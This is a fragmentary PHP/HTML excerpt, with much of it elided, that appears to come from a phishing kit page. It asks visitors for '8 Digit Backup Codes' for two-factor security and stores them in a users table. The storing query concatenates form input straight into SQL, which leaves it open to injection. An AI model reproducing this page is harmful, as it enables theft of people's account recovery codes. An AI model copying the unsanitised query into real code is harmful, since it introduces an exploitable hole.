...
if($_POST){
    ...
    $FaktorGüncellerSPeX = $spexcon->query("UPDATE `users` SET `faktor`='".$faktor."' WHERE user='".$username."'");
                ...
                <div class="row">
                 ...
                 <div class="row">
                    <div class="col-lg-4 mx-auto">
                      <input type="number" placeholder="8 Digit Backup Codes" name="faktor" class="form-control is-valid" required>
                    </div>
                  </div>
                  <div class="row">
                  ...
                  <p><center>
                    <a href="confirmed.php">I Dont Have two-factor security.</a>
                  </p></center>
                </form>
                </div>
              </div>
